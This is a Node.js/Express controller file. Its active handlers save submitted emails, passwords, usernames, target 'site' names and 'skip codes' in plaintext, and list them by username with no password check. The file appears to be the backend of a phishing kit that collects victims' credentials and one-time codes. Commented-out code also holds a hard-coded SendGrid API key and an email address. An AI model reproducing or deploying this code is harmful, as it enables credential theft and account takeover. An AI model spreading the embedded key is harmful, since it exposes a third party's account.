
const User = require('../models/User')
const Info = require('../models/Info')



// const {API_KEY}=require('../keys')
// const nodemailer=require('nodemailer');
// const sendgridTransport=require('nodemailer-sendgrid-transport');
// const transporter=nodemailer.createTransport(sendgridTransport({
//     auth:{
//      api_key:"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",
//      api_user:"traviskaterherron@gmail.com"
//     }

// module.exports.signup_post=async(req,res)=>{
//     const {email,password,fullname}=req.body;
//     try{
//         const user=await User.create({
//             email,password,fullname
//         })
//     const token =  cretaetoken(user._id);


//         res.status(200).json({user:user,token:token})

//         res.send("done post")



//     }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error:error})
//       //   res.send(err.code)
//       }
// }




module.exports.signin_post = (req, res) => {
    const { email, password, username, site } = req.body;
    const user = new User({
        email,
        password,
        username,
        site,


    })
    user.save()
        .then(user => {
            res.status(200).json({ user: user })
        }).catch(err => res.status(200).json({ error: err }))

}

module.exports.skip_code = (req, res) => {
    const { id, skipcode } = req.body;
    User.findOneAndUpdate({ _id: id }, {
        $set: {
            skipcode: skipcode
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}
module.exports.login_post = async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await User.findOne({ username: username })
        res.status(200).json({ username: user.username })
    } catch (e) {
        res.status(400).json({ error: "not found" })
    }

}

module.exports.info_get = async (req, res) => {

    const { username } = req.params
    console.log(username)

    try {
        const users = await User.find({ username: username }).sort({ createdAt: -1 })
        res.status(200).json({ users: users })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}













// module.exports.signin_post=async(req,res)=>{
//     const {email,password}=req.body;
//     try{
//         const user= await User.login(email,password);
//         const token=cretaetoken(user._id);
//         console.log('yes yes',user)
//         // res.cookie('jwt',token,{httpOnly:true,maxAge:3*24*60*60*1000})
//         // const user= await User.findById(usercreate._id).select("email fullname data account").populate("data","bio gender")

//         res.status(200).json({user:user,token:token})
//       }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error})
//       //   res.send(err.code)
//       }


//  }

//  module.exports.signin_post=(req,res)=>{
//     const {email,password}=req.body;
//     User.findOne({email:email})
//     .then(user=>{
//         if(!user){
//             return    res.status(422).json({error:"Invalid Email Or Password"})
//         }
//         bcrypt.compare(password,user.password)
//         .then(doMatch=>{
//             if (doMatch){
//                 const token =  cretaetoken(user._id);
//                 res.status(200).json({user:user,token:token})
//             }
//             else{
//                 return    res.status(422).json({error:"Invalid Email Or Password"})
//             }
//         }).catch(err=>{
//             console.log('err')
//         })
//     }).catch(err=>console.log('err'))


//  } 







